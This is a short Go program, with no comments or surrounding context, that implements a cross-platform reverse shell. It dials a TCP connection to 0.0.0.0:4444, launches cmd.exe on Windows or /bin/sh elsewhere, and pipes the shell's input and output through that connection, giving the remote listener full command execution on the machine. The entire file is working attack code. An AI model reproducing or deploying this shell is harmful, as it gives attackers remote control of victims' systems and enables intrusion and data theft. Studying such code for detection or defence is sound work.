package main

import (
    "net"
    "os/exec"
    "runtime"
)

func main() {
    host := "0.0.0.0:4444"
    
    conn, err := net.Dial("tcp", host)
    if err != nil {
        return
    }
    defer conn.Close()
    
    var shell string
    if runtime.GOOS == "windows" {
        shell = "cmd.exe"
    } else {
        shell = "/bin/sh"
    }
    
    cmd := exec.Command(shell)
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    
    cmd.Run()
}
